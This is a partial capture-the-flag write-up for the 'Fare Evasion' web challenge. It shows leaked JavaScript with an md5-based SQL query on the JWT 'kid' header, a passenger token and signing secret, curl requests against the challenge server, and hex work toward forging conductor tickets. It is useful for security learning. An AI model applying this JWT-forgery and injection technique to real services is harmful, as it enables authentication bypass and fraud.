# Fare Evasion - Web

## Description

SIGPwny Transit Authority needs your fares, but the system is acting a tad odd. We'll let you sign your tickets this time!

<https://fare-evasion.chal.uiuc.tf/>

## Solution

```javascript

async function pay() {
    // i could not get sqlite to work on the frontend :(
    /*
    db.each(`SELECT * FROM keys WHERE kid = '${md5(headerKid)}'`, (err, row) => {
    ???????
    */
    const r = await fetch("/pay", { method: "POST" });
    const j = await r.json();
    document.getElementById("alert").classList.add("opacity-100");
    // todo: convert md5 to hex string instead of latin1??
    document.getElementById("alert").innerText = j["message"];
    setTimeout(() => { document.getElementById("alert").classList.remove("opacity-100") }, 5000);
}
```

hashed _RòsÜxÉÄÅ´\ä secret: a_boring_passenger_signing_key_?

0852c3b21e73c39c78c389c38402c385c2b4125cc3a4

access_token: eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs

https://github.com/ticarpi/jwt_tool

```bash
┌──(kali㉿kali)-[~]
└─$ curl https://fare-evasion.chal.uiuc.tf/pay --data "junk=junk"
{"message":"Transaction failed. Where's your token?","success":false}

┌──(kali㉿kali)-[~]
└─$ curl https://fare-evasion.chal.uiuc.tf/pay --cookie "access_token=eyJhbGciOiJIUzI1NiIsImtpZCI6InBhc3Nlbmdlcl9rZXkiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.EqwTzKXS85U_CbNznSxBz8qA1mDZOs1JomTXSbsw0Zs" --data "junk"
{"message":"Sorry passenger, only conductors are allowed right now. Please sign your own tickets. \nhashed _\bR\u00f2\u001es\u00dcx\u00c9\u00c4\u0002\u00c5\u00b4\u0012\\\u00e4 secret: a_boring_passenger_signing_key_?","success":false}
```

_  \b R  f2 1e s  dc x  c9 c4 02 c5 b4 12 \  e4

5f 08 52 f2 1e 73 dc 78 c9 c4 02 c5 b4 12 5c e4

"passenger_key" -> 5f0852f21e73dc78c9c402c5b4125ce4